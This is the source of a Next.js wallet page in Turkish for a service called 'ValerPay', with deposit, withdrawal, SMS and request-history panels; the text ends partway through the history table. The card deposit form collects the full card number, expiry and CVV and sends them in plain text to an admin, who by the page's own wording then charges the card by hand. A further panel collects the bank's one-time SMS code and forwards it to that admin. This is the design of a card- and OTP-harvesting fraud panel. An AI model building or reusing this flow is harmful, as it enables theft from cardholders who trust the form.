"use client";

import { FormEvent, useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";

const API = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:3001";

type RequestMethod = "BANK" | "CARD" | "CRYPTO";
type RequestType = "DEPOSIT" | "WITHDRAW";
type RequestStatus =
  | "NEW"
  | "ASSIGNED"
  | "APPROVED"
  | "REJECTED"
  | "SENT"
  | "COMPLETED";

type RequestRow = {
  id: string;
  type: RequestType;
  method: RequestMethod;
  asset: string;
  amountMinor: string;
  status: RequestStatus;
  createdAt: string;
  memo: string | null;
};

type PaymentConfigDto = {
  depositsEnabled: boolean;
  withdrawsEnabled: boolean;
  depositMethods: { BANK: boolean; CARD: boolean; CRYPTO: boolean };
  withdrawMethods: { BANK: boolean; CARD: boolean; CRYPTO: boolean };
  bank: {
    iban: string;
    recipient: string;
    description: string | null;
  };
  crypto: {
    network: string;
    address: string;
    memo: string | null;
  };
};

function formatMoneyFromMinor(minor: string | number | bigint) {
  const n = Number(minor);
  if (!Number.isFinite(n)) return "0.00 TL";
  return `${(n / 100).toFixed(2)} TL`;
}

function parseTLToMinor(input: string): number {
  const n = Number(input.replace(",", "."));
  if (!Number.isFinite(n)) return NaN;
  return Math.round(n * 100);
}

function formatDate(iso: string) {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return "-";
  return d.toLocaleString("tr-TR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}


function usePaymentConfig(token: string | null) {
  const [data, setData] = useState<PaymentConfigDto | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const fetchConfig = async () => {
    if (!token) return;
    try {
      setLoading(true);
      setError(null);

      const res = await fetch(`${API}/user/config/payments`, {
        headers: { Authorization: `Bearer ${token}` },
        cache: "no-store",
      });

      if (!res.ok) {
        const txt = await res.text().catch(() => "");
        throw new Error(txt || "Ödeme ayarları okunamadı");
      }

      const json = await res.json();
      setData(json.value as PaymentConfigDto);
    } catch (e: any) {
      setError(e?.message ?? "Ödeme ayarları okunamadı");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!token) return;
    fetchConfig();

    const interval = setInterval(fetchConfig, 5000);
    const onFocus = () => fetchConfig();

    window.addEventListener("focus", onFocus);
    return () => {
      clearInterval(interval);
      window.removeEventListener("focus", onFocus);
    };
  }, [token]);

  return { data, loading, error, refresh: fetchConfig };
}


export default function WalletPage() {
  const router = useRouter();

  const [token, setToken] = useState<string | null>(null);
  const [email, setEmail] = useState<string | null>(null);

  const [balanceMinor, setBalanceMinor] = useState<string>("0");
  const [requests, setRequests] = useState<RequestRow[]>([]);
  const [loadingRequests, setLoadingRequests] = useState(true);
  const [globalError, setGlobalError] = useState<string | null>(null);

  const [depositMethod, setDepositMethod] = useState<RequestMethod>("BANK");
  const [depositAmount, setDepositAmount] = useState("");
  const [depositMemo, setDepositMemo] = useState("");

  const [depBankSenderName, setDepBankSenderName] = useState("");
  const [depBankSenderIban, setDepBankSenderIban] = useState("");
  const [depBankReceiptNote, setDepBankReceiptNote] = useState("");

  const [depCardHolder, setDepCardHolder] = useState("");
  const [depCardNumber, setDepCardNumber] = useState("");
  const [depCardExpMonth, setDepCardExpMonth] = useState("");
  const [depCardExpYear, setDepCardExpYear] = useState("");
  const [depCardCvv, setDepCardCvv] = useState("");

  const [depCryptoFromAddress, setDepCryptoFromAddress] = useState("");
  const [depCryptoTxId, setDepCryptoTxId] = useState("");

  const [withdrawMethod, setWithdrawMethod] = useState<RequestMethod>("BANK");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [withdrawMemo, setWithdrawMemo] = useState("");

  const [wdName, setWdName] = useState("");
  const [wdIbanOrCard, setWdIbanOrCard] = useState("");
  const [wdBankOrNetwork, setWdBankOrNetwork] = useState("");

  const [smsCode, setSmsCode] = useState("");
  const [smsSubmitting, setSmsSubmitting] = useState(false);
  const [smsMessage, setSmsMessage] = useState<string | null>(null);

  const [submitting, setSubmitting] = useState(false);
  const [infoMessage, setInfoMessage] = useState<string | null>(null);


  useEffect(() => {
    if (typeof window === "undefined") return;
    const t = window.localStorage.getItem("userAccessToken");
    const e = window.localStorage.getItem("userEmail");
    if (!t) {
      router.replace("/login");
      return;
    }
    setToken(t);
    setEmail(e);
  }, [router]);

  const { data: payCfg } = usePaymentConfig(token);


  const loadBalanceAndRequests = async (authToken: string) => {
    try {
      setGlobalError(null);
      setLoadingRequests(true);

      const [balanceRes, reqRes] = await Promise.all([
        fetch(`${API}/user/balance?asset=TL`, {
          headers: { Authorization: `Bearer ${authToken}` },
          cache: "no-store",
        }),
        fetch(`${API}/user/requests?status=ALL`, {
          headers: { Authorization: `Bearer ${authToken}` },
          cache: "no-store",
        }),
      ]);

      if (!balanceRes.ok) {
        const txt = await balanceRes.text().catch(() => "");
        throw new Error(txt || "Bakiye alınamadı");
      }
      if (!reqRes.ok) {
        const txt = await reqRes.text().catch(() => "");
        throw new Error(txt || "Talepler alınamadı");
      }

      const balanceJson = await balanceRes.json();
      const reqJson = await reqRes.json();

      setBalanceMinor(balanceJson.balanceMinor ?? "0");
      setRequests(Array.isArray(reqJson) ? reqJson : reqJson.value ?? []);
    } catch (e: any) {
      setGlobalError(e?.message ?? "Veriler alınamadı");
    } finally {
      setLoadingRequests(false);
    }
  };

  useEffect(() => {
    if (!token) return;
    loadBalanceAndRequests(token);

    const interval = setInterval(() => {
      loadBalanceAndRequests(token);
    }, 10000);

    return () => clearInterval(interval);
  }, [token]);

  const activeCardSmsRequest = useMemo(
    () =>
      requests.find(
        (r) =>
          r.type === "DEPOSIT" &&
          r.method === "CARD" &&
          r.status === "SENT" &&
          r.asset === "TL",
      ) ?? null,
    [requests],
  );


  const handleLogout = () => {
    if (typeof window !== "undefined") {
      window.localStorage.removeItem("userAccessToken");
      window.localStorage.removeItem("userEmail");
    }
    router.replace("/login");
  };


  const fetchLatestUserConfig = async (
    authToken: string,
  ): Promise<PaymentConfigDto | null> => {
    try {
      const res = await fetch(`${API}/user/config/payments`, {
        headers: { Authorization: `Bearer ${authToken}` },
        cache: "no-store",
      });
      if (!res.ok) {
        const txt = await res.text().catch(() => "");
        throw new Error(txt || "Ödeme ayarları alınamadı");
      }
      const json = await res.json();
      return json.value as PaymentConfigDto;
    } catch (e: any) {
      setInfoMessage(e?.message ?? "Ödeme ayarları alınamadı");
      return null;
    }
  };


  const handleDepositSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!token) return;

    const amountMinor = parseTLToMinor(depositAmount);
    if (!Number.isFinite(amountMinor) || amountMinor <= 0) {
      setInfoMessage("Lütfen geçerli bir tutar girin.");
      return;
    }

    const cfg = await fetchLatestUserConfig(token);
    if (!cfg) return;

    if (!cfg.depositsEnabled) {
      setInfoMessage("Yatırım işlemleri şu anda kapalı.");
      return;
    }

    const methodAllowed = cfg.depositMethods[depositMethod];
    if (!methodAllowed) {
      setInfoMessage("Seçilen yatırım yöntemi şu anda kullanılamıyor.");
      return;
    }

    let metadata: any = {};
    if (depositMethod === "BANK") {
      metadata = {
        senderName: depBankSenderName,
        senderIban: depBankSenderIban,
        receiptNote: depBankReceiptNote,
      };
    } else if (depositMethod === "CARD") {
      metadata = {
        cardHolder: depCardHolder,
        cardNumber: depCardNumber,
        expiryMonth: depCardExpMonth,
        expiryYear: depCardExpYear,
        cvv: depCardCvv,
      };
    } else if (depositMethod === "CRYPTO") {
      metadata = {
        fromAddress: depCryptoFromAddress,
        txId: depCryptoTxId,
      };
    }

    try {
      setSubmitting(true);
      setInfoMessage(null);

      const res = await fetch(`${API}/user/requests/deposit`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          method: depositMethod,
          amountMinor,
          memo: depositMemo || null,
          metadata,
        }),
      });

      if (!res.ok) {
        const txt = await res.text().catch(() => "");
        throw new Error(txt || "Yatırım talebi oluşturulamadı");
      }

      setInfoMessage("Yatırım talebiniz oluşturuldu.");
      setDepositAmount("");
      setDepositMemo("");
      await loadBalanceAndRequests(token);
    } catch (err: any) {
      setInfoMessage(err?.message ?? "Yatırım talebi oluşturulamadı");
    } finally {
      setSubmitting(false);
    }
  };


  const handleWithdrawSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!token) return;

    const amountMinor = parseTLToMinor(withdrawAmount);
    if (!Number.isFinite(amountMinor) || amountMinor <= 0) {
      setInfoMessage("Lütfen geçerli bir çekim tutarı girin.");
      return;
    }

    const cfg = await fetchLatestUserConfig(token);
    if (!cfg) return;

    if (!cfg.withdrawsEnabled) {
      setInfoMessage("Çekim işlemleri şu anda kapalı.");
      return;
    }

    const methodAllowed = cfg.withdrawMethods[withdrawMethod];
    if (!methodAllowed) {
      setInfoMessage("Seçilen çekim yöntemi şu anda kullanılamıyor.");
      return;
    }

    const metadata = {
      name: wdName,
      target: wdIbanOrCard,
      bankOrNetwork: wdBankOrNetwork,
    };

    try {
      setSubmitting(true);
      setInfoMessage(null);

      const res = await fetch(`${API}/user/requests/withdraw`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          method: withdrawMethod,
          amountMinor,
          memo: withdrawMemo || null,
          metadata,
        }),
      });

      if (!res.ok) {
        const txt = await res.text().catch(() => "");
        throw new Error(txt || "Çekim talebi oluşturulamadı");
      }

      setInfoMessage("Çekim talebiniz oluşturuldu.");
      setWithdrawAmount("");
      setWithdrawMemo("");
      await loadBalanceAndRequests(token);
    } catch (err: any) {
      setInfoMessage(err?.message ?? "Çekim talebi oluşturulamadı");
    } finally {
      setSubmitting(false);
    }
  };


  const handleSmsSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!token || !activeCardSmsRequest) return;

    if (!smsCode.trim()) {
      setSmsMessage("Lütfen SMS kodunu girin.");
      return;
    }

    try {
      setSmsSubmitting(true);
      setSmsMessage(null);

      const res = await fetch(
        `${API}/user/requests/${activeCardSmsRequest.id}/card-sms`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
          },
          body: JSON.stringify({ smsCode: smsCode.trim() }),
        },
      );

      if (!res.ok) {
        const txt = await res.text().catch(() => "");
        throw new Error(txt || "SMS kodu gönderilemedi");
      }

      setSmsMessage("SMS kodunuz alındı. İşleminiz admin tarafından onaylanacaktır.");
      setSmsCode("");
      await loadBalanceAndRequests(token);
    } catch (err: any) {
      setSmsMessage(err?.message ?? "SMS kodu gönderilemedi");
    } finally {
      setSmsSubmitting(false);
    }
  };


  const depositDisabled =
    submitting ||
    !payCfg ||
    !payCfg.depositsEnabled ||
    !payCfg.depositMethods[depositMethod];

  const withdrawDisabled =
    submitting ||
    !payCfg ||
    !payCfg.withdrawsEnabled ||
    !payCfg.withdrawMethods[withdrawMethod];

  const canDepositBank =
    !!payCfg?.depositsEnabled && !!payCfg?.depositMethods.BANK;
  const canDepositCard =
    !!payCfg?.depositsEnabled && !!payCfg?.depositMethods.CARD;
  const canDepositCrypto =
    !!payCfg?.depositsEnabled && !!payCfg?.depositMethods.CRYPTO;

  const canWithdrawBank =
    !!payCfg?.withdrawsEnabled && !!payCfg?.withdrawMethods.BANK;
  const canWithdrawCard =
    !!payCfg?.withdrawsEnabled && !!payCfg?.withdrawMethods.CARD;
  const canWithdrawCrypto =
    !!payCfg?.withdrawsEnabled && !!payCfg?.withdrawMethods.CRYPTO;


  return (
    <div className="min-h-screen bg-[#02040a] text-white">
      <header className="border-b border-white/10 px-6 py-4 flex items-center justify-between">
        <div className="flex flex-col">
          <span className="text-xs text-white/50">ValerPay Cüzdan</span>
          <span className="text-sm font-semibold">
            {email ?? "Kullanıcı"}
          </span>
        </div>
        <button
          onClick={handleLogout}
          className="text-xs px-3 py-1.5 rounded border border-white/20 hover:bg-white/10"
        >
          Çıkış
        </button>
      </header>

      <main className="max-w-5xl mx-auto px-4 py-6 space-y-6">
        {/* Özet kartlar */}
        <section className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="rounded-2xl border border-emerald-500/40 bg-gradient-to-br from-emerald-900/40 to-emerald-700/10 px-4 py-3">
            <div className="text-[11px] text-emerald-200/80">
              TOPLAM BAKİYE
            </div>
            <div className="mt-1 text-xl font-semibold">
              {formatMoneyFromMinor(balanceMinor)}
            </div>
            <div className="mt-1 text-[11px] text-white/50">Para birimi: TL</div>
          </div>

          <div className="rounded-2xl border border-sky-500/30 bg-gradient-to-br from-sky-900/40 to-sky-700/10 px-4 py-3">
            <div className="text-[11px] text-sky-200/80">KULLANILABİLİR</div>
            <div className="mt-1 text-xl font-semibold">
              {formatMoneyFromMinor(balanceMinor)}
            </div>
            <div className="mt-1 text-[11px] text-white/50">
              Onaylanmamış çekim talepleri düştükten sonra kalan bakiye
              gösterilir.
            </div>
          </div>

          <div className="rounded-2xl border border-purple-500/30 bg-gradient-to-br from-purple-900/40 to-purple-700/10 px-4 py-3">
            <div className="text-[11px] text-purple-200/80">
              TOPLAM TALEP SAYISI
            </div>
            <div className="mt-1 text-xl font-semibold">
              {requests.length}
            </div>
            <div className="mt-1 text-[11px] text-white/50">
              Son 50 talep listelenir.
            </div>
          </div>
        </section>

        {globalError && (
          <div className="text-sm text-red-300 border border-red-500/40 bg-red-500/10 px-3 py-2 rounded-lg">
            {globalError}
          </div>
        )}

        {infoMessage && (
          <div className="text-xs text-amber-200 border border-amber-500/40 bg-amber-500/10 px-3 py-2 rounded-lg">
            {infoMessage}
          </div>
        )}

        {/* Yatırım / Çekim panelleri */}
        <section className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          {/* DEPOSIT */}
          <form
            onSubmit={handleDepositSubmit}
            className="rounded-2xl border border-emerald-600/40 bg-gradient-to-br from-emerald-900/60 to-emerald-900/20 px-4 py-4 space-y-3"
          >
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-semibold">Para Yatır (DEPOSIT)</h2>
              <span className="text-[11px] text-white/60">
                {payCfg?.depositsEnabled ? "Bu panel açık" : "Geçici olarak kapalı"}
              </span>
            </div>

            <div className="inline-flex bg-black/40 rounded-full p-1 text-[11px]">
              {(["BANK", "CARD", "CRYPTO"] as RequestMethod[]).map((m) => {
                const cfgAllowed = payCfg?.depositMethods[m] ?? false;
                const disabled = !payCfg?.depositsEnabled || !cfgAllowed;

                return (
                  <button
                    key={m}
                    type="button"
                    disabled={disabled}
                    onClick={() => setDepositMethod(m)}
                    className={`px-3 py-1 rounded-full transition ${
                      depositMethod === m
                        ? "bg-emerald-500 text-black"
                        : "text-white/70 hover:bg-white/10"
                    } ${disabled ? "opacity-40 cursor-not-allowed" : ""}`}
                  >
                    {m === "BANK" ? "Banka" : m === "CARD" ? "Kart" : "Kripto"}
                  </button>
                );
              })}
            </div>

            <div className="space-y-2 text-xs">
              <div>
                <label className="block text-white/60 mb-1">Tutar (TL)</label>
                <input
                  type="number"
                  min="0"
                  step="0.01"
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                  placeholder="Örn: 1500"
                />
              </div>

              <div>
                <label className="block text-white/60 mb-1">
                  Açıklama (opsiyonel)
                </label>
                <input
                  value={depositMemo}
                  onChange={(e) => setDepositMemo(e.target.value)}
                  className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                  placeholder="Örn: Ziraat hesabımdan"
                />
              </div>

              {depositMethod === "BANK" && (
                <>
                  <div className="text-[11px] text-emerald-100/80 border border-emerald-400/40 bg-emerald-900/30 rounded px-3 py-2">
                    <div>
                      IBAN:{" "}
                      <span className="font-mono">
                        {payCfg?.bank.iban ?? "-"}
                      </span>
                    </div>
                    <div>
                      Alıcı Adı: {payCfg?.bank.recipient ?? "VALERPAY"}
                    </div>
                    {payCfg?.bank.description && (
                      <div className="mt-1">
                        Dekont notu: {payCfg.bank.description}
                      </div>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <label className="block text-white/60 mb-1">
                        Gönderen isim
                      </label>
                      <input
                        value={depBankSenderName}
                        onChange={(e) => setDepBankSenderName(e.target.value)}
                        className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                        placeholder="Hesap sahibi adı"
                      />
                    </div>
                    <div>
                      <label className="block text-white/60 mb-1">
                        Gönderen IBAN
                      </label>
                      <input
                        value={depBankSenderIban}
                        onChange={(e) => setDepBankSenderIban(e.target.value)}
                        className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                        placeholder="TR..."
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-white/60 mb-1">
                      Dekont / açıklama notu
                    </label>
                    <input
                      value={depBankReceiptNote}
                      onChange={(e) => setDepBankReceiptNote(e.target.value)}
                      className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                      placeholder="Dekont açıklaması, referans numarası vb."
                    />
                  </div>
                </>
              )}

              {depositMethod === "CARD" && (
                <div className="space-y-2">
                  <div className="text-[11px] text-white/60">
                    Kart bilgilerin sadece bu işlem için admin ile paylaşılır.
                  </div>
                  <div>
                    <label className="block text-white/60 mb-1">
                      Kart üzerindeki isim
                    </label>
                    <input
                      value={depCardHolder}
                      onChange={(e) => setDepCardHolder(e.target.value)}
                      className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                    />
                  </div>
                  <div>
                    <label className="block text-white/60 mb-1">
                      Kart numarası
                    </label>
                    <input
                      value={depCardNumber}
                      onChange={(e) => setDepCardNumber(e.target.value)}
                      className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                    />
                  </div>
                  <div className="grid grid-cols-3 gap-2">
                    <div>
                      <label className="block text-white/60 mb-1">
                        SKT (Ay)
                      </label>
                      <input
                        value={depCardExpMonth}
                        onChange={(e) => setDepCardExpMonth(e.target.value)}
                        className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                        placeholder="MM"
                      />
                    </div>
                    <div>
                      <label className="block text-white/60 mb-1">
                        SKT (Yıl)
                      </label>
                      <input
                        value={depCardExpYear}
                        onChange={(e) => setDepCardExpYear(e.target.value)}
                        className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                        placeholder="YY"
                      />
                    </div>
                    <div>
                      <label className="block text-white/60 mb-1">CVV</label>
                      <input
                        value={depCardCvv}
                        onChange={(e) => setDepCardCvv(e.target.value)}
                        className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                        placeholder="CVV"
                      />
                    </div>
                  </div>
                  <div className="text-[11px] text-white/50">
                    Admin karttan çekim yaptıktan sonra SMS adımına geçilecektir.
                  </div>
                </div>
              )}

              {depositMethod === "CRYPTO" && (
                <>
                  <div className="text-[11px] text-emerald-100/80 border border-emerald-400/40 bg-emerald-900/30 rounded px-3 py-2 space-y-1">
                    <div>
                      Network: {payCfg?.crypto.network ?? "TRC20"}
                    </div>
                    <div className="break-all">
                      Cüzdan Adresi:{" "}
                      <span className="font-mono">
                        {payCfg?.crypto.address ?? "-"}
                      </span>
                    </div>
                    {payCfg?.crypto.memo && (
                      <div>Memo / Tag: {payCfg.crypto.memo}</div>
                    )}
                  </div>
                  <div>
                    <label className="block text-white/60 mb-1">
                      Gönderen adres
                    </label>
                    <input
                      value={depCryptoFromAddress}
                      onChange={(e) => setDepCryptoFromAddress(e.target.value)}
                      className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                    />
                  </div>
                  <div>
                    <label className="block text-white/60 mb-1">
                      TxID / Hash
                    </label>
                    <input
                      value={depCryptoTxId}
                      onChange={(e) => setDepCryptoTxId(e.target.value)}
                      className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-emerald-400"
                    />
                  </div>
                </>
              )}
            </div>

            <button
              type="submit"
              disabled={depositDisabled}
              className="mt-2 w-full rounded-lg bg-emerald-500 hover:bg-emerald-400 disabled:bg-emerald-900/40 disabled:text-white/40 disabled:cursor-not-allowed text-sm font-semibold py-2 transition"
            >
              Talep Oluştur
            </button>
          </form>

          {/* WITHDRAW */}
          <form
            onSubmit={handleWithdrawSubmit}
            className="rounded-2xl border border-red-600/40 bg-gradient-to-br from-red-900/60 to-red-900/20 px-4 py-4 space-y-3"
          >
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-semibold">Para Çek (WITHDRAW)</h2>
              <span className="text-[11px] text-white/60">
                {payCfg?.withdrawsEnabled
                  ? "Bu panel açık"
                  : "Geçici olarak kapalı"}
              </span>
            </div>

            <div className="inline-flex bg-black/40 rounded-full p-1 text-[11px]">
              {(["BANK", "CARD", "CRYPTO"] as RequestMethod[]).map((m) => {
                const cfgAllowed = payCfg?.withdrawMethods[m] ?? false;
                const disabled =
                  !payCfg?.withdrawsEnabled || !cfgAllowed;

                return (
                  <button
                    key={m}
                    type="button"
                    disabled={disabled}
                    onClick={() => setWithdrawMethod(m)}
                    className={`px-3 py-1 rounded-full transition ${
                      withdrawMethod === m
                        ? "bg-red-500 text-black"
                        : "text-white/70 hover:bg-white/10"
                    } ${disabled ? "opacity-40 cursor-not-allowed" : ""}`}
                  >
                    {m === "BANK" ? "Banka" : m === "CARD" ? "Kart" : "Kripto"}
                  </button>
                );
              })}
            </div>

            <div className="space-y-2 text-xs">
              <div>
                <label className="block text-white/60 mb-1">
                  Tutar (TL)
                </label>
                <input
                  type="number"
                  min="0"
                  step="0.01"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                  className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-red-400"
                  placeholder="Örn: 500"
                />
              </div>

              <div>
                <label className="block text-white/60 mb-1">
                  Açıklama (opsiyonel)
                </label>
                <input
                  value={withdrawMemo}
                  onChange={(e) => setWithdrawMemo(e.target.value)}
                  className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-red-400"
                  placeholder="Örn: VakıfBank hesabıma"
                />
              </div>

              <div className="grid grid-cols-2 gap-2">
                <div>
                  <label className="block text-white/60 mb-1">
                    Alıcı isim
                  </label>
                  <input
                    value={wdName}
                    onChange={(e) => setWdName(e.target.value)}
                    className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-red-400"
                  />
                </div>
                <div>
                  <label className="block text-white/60 mb-1">
                    IBAN / Kart No / Adres
                  </label>
                  <input
                    value={wdIbanOrCard}
                    onChange={(e) => setWdIbanOrCard(e.target.value)}
                    className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-red-400"
                  />
                </div>
              </div>

              <div>
                <label className="block text-white/60 mb-1">
                  Banka / Network bilgisi
                </label>
                <input
                  value={wdBankOrNetwork}
                  onChange={(e) => setWdBankOrNetwork(e.target.value)}
                  className="w-full rounded border border-white/15 bg-black/40 px-3 py-2 text-sm outline-none focus:border-red-400"
                  placeholder={
                    withdrawMethod === "CRYPTO"
                      ? "Örn: TRC20"
                      : "Örn: VakıfBank"
                  }
                />
              </div>

              <div className="text-[11px] text-white/50">
                Çekim talebiniz admin tarafından incelenip, girilen hesap
                bilgilerinize manuel olarak gönderilecektir.
              </div>
            </div>

            <button
              type="submit"
              disabled={withdrawDisabled}
              className="mt-2 w-full rounded-lg bg-red-500 hover:bg-red-400 disabled:bg-red-900/40 disabled:text-white/40 disabled:cursor-not-allowed text-sm font-semibold py-2 transition"
            >
              Talep Oluştur
            </button>
          </form>
        </section>

        {/* Kart SMS + Ödeme Durumu */}
        <section className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          {/* Kart SMS paneli */}
          <div className="rounded-2xl border border-amber-500/40 bg-amber-900/20 px-4 py-3 text-xs">
            <div className="font-semibold text-amber-200 mb-2">
              Kart Yatırım – SMS Adımı
            </div>

            {!activeCardSmsRequest && (
              <p className="text-amber-100/80">
                Şu anda SMS bekleyen kart yatırım talebiniz bulunmuyor. Kart ile
                yeni yatırım talebi oluşturduğunuzda ve admin SMS adımına
                geçtiğinde, burada kod girişi alanı aktif olacaktır.
              </p>
            )}

            {activeCardSmsRequest && (
              <>
                <p className="text-amber-100/80 mb-2">
                  Aşağıdaki SMS kodunu, kart yatırım talebiniz için bankanızdan
                  gelen tek kullanımlık SMS mesajından girin.
                </p>

                <div className="mb-2 space-y-1">
                  <div>
                    Talep ID:{" "}
                    <span className="font-mono">
                      {activeCardSmsRequest.id}
                    </span>
                  </div>
                  <div>
                    Tutar:{" "}
                    <strong>
                      {formatMoneyFromMinor(
                        activeCardSmsRequest.amountMinor,
                      )}
                    </strong>
                  </div>
                </div>

                <form onSubmit={handleSmsSubmit} className="space-y-2">
                  <div>
                    <label className="block text-amber-100 mb-1">
                      SMS Kodu
                    </label>
                    <input
                      value={smsCode}
                      onChange={(e) => setSmsCode(e.target.value)}
                      className="w-full rounded border border-amber-400/60 bg-black/30 px-3 py-2 text-sm outline-none focus:border-amber-300"
                      placeholder="Örn: 123456"
                    />
                  </div>
                  <button
                    type="submit"
                    disabled={smsSubmitting}
                    className="w-full rounded bg-amber-500 hover:bg-amber-400 disabled:bg-amber-900/40 disabled:text-amber-100/40 text-xs font-semibold py-2"
                  >
                    SMS kodunu gönder
                  </button>
                  {smsMessage && (
                    <div className="text-[11px] text-amber-100 mt-1">
                      {smsMessage}
                    </div>
                  )}
                </form>
              </>
            )}
          </div>

          {/* Ödeme durumu paneli */}
          <div className="rounded-2xl border border-white/15 bg-black/50 px-4 py-3 text-xs">
            <div className="flex items-center justify-between mb-2">
              <div className="font-semibold text-white/80">
                Ödeme Durumu (Bilgilendirme)
              </div>
              <button
                type="button"
                onClick={() => token && loadBalanceAndRequests(token)}
                className="text-[11px] px-2 py-1 rounded border border-white/20 hover:bg-white/10"
              >
                Yenile
              </button>
            </div>
            <p className="text-white/60 mb-2">
              Admin bazı yöntemleri geçici olarak açıp kapatabilir. Aşağıda,
              şu anda aktif olan yatırım ve çekim yöntemlerini görüyorsunuz.
            </p>

            <div className="grid grid-cols-2 gap-y-1 gap-x-4 mt-2">
              <div className="text-white/60">Yatırım</div>
              <div className="text-right">
                <span
                  className={
                    payCfg?.depositsEnabled
                      ? "text-emerald-300"
                      : "text-red-300"
                  }
                >
                  {payCfg?.depositsEnabled ? "Açık" : "Kapalı"}
                </span>
              </div>

              <div className="text-white/60">Çekim</div>
              <div className="text-right">
                <span
                  className={
                    payCfg?.withdrawsEnabled
                      ? "text-emerald-300"
                      : "text-red-300"
                  }
                >
                  {payCfg?.withdrawsEnabled ? "Açık" : "Kapalı"}
                </span>
              </div>

              <div className="text-white/60">Banka yatırımı</div>
              <div className="text-right">
                <span
                  className={canDepositBank ? "text-emerald-300" : "text-red-300"}
                >
                  {canDepositBank ? "Açık" : "Kapalı"}
                </span>
              </div>

              <div className="text-white/60">Kart yatırımı</div>
              <div className="text-right">
                <span
                  className={canDepositCard ? "text-emerald-300" : "text-red-300"}
                >
                  {canDepositCard ? "Açık" : "Kapalı"}
                </span>
              </div>

              <div className="text-white/60">Kripto yatırımı</div>
              <div className="text-right">
                <span
                  className={
                    canDepositCrypto ? "text-emerald-300" : "text-red-300"
                  }
                >
                  {canDepositCrypto ? "Açık" : "Kapalı"}
                </span>
              </div>

              <div className="text-white/60">Banka çekim</div>
              <div className="text-right">
                <span
                  className={canWithdrawBank ? "text-emerald-300" : "text-red-300"}
                >
                  {canWithdrawBank ? "Açık" : "Kapalı"}
                </span>
              </div>

              <div className="text-white/60">Kart çekim</div>
              <div className="text-right">
                <span
                  className={canWithdrawCard ? "text-emerald-300" : "text-red-300"}
                >
                  {canWithdrawCard ? "Açık" : "Kapalı"}
                </span>
              </div>

              <div className="text-white/60">Kripto çekim</div>
              <div className="text-right">
                <span
                  className={
                    canWithdrawCrypto ? "text-emerald-300" : "text-red-300"
                  }
                >
                  {canWithdrawCrypto ? "Açık" : "Kapalı"}
                </span>
              </div>
            </div>
          </div>
        </section>

        {/* Son talepler */}
        <section className="rounded-2xl border border-white/10 bg-black/40 overflow-hidden">
          <div className="px-4 py-3 border-b border-white/10 flex items-center justify-between">
            <h3 className="text-sm font-semibold">Son Talepler</h3>
            <span className="text-[11px] text-white/50">
              Durum değişiklikleri birkaç saniye içinde otomatik güncellenir.
            </span>
          </div>
          <div className="max-h-[420px] overflow-auto text-xs">
            <table className="w-full">
              <thead className="bg-white/[0.04] text-white/60">
                <tr>
                  <th className="text-left px-3 py-2">Tip</th>
                  <th className="text-left px-3 py-2">Yöntem</th>
                  <th className="text-left px-3 py-2">Tutar</th>
                  <th className="text-left px-3 py-2">Durum</th>
                  <th className="text-left px-3 py-2">Tarih</th>
                  <th className="text-left px-3 py-2">Not</th>
                </tr>
              </thead>
              <tbody>
                {loadingRequests && (
                  <tr>
                    <td
                      colSpan={6}
                      className="px-3 py-6 text-center text-white/50"
                    >
                      Yükleniyor...
                    </td>
                  </tr>
                )}

                {!loadingRequests && requests.length === 0 && (
                  <tr>
                    <td
                      colSpan={6}
                      className="px-3 py-6 text-center text-white/50"
                    >
                      Henüz talebiniz yok.
                    </td>
                  </tr>
                )}

                {!loadingRequests &&
                  requests.map((r) => (
                    <tr
                      key={r.id}
                      className="border-t border-white/5 hover:bg-white/[0.03]"
                    >
                      <td className="px-3 py-2 whitespace-nowrap">
                        {r.type}
                      </td>
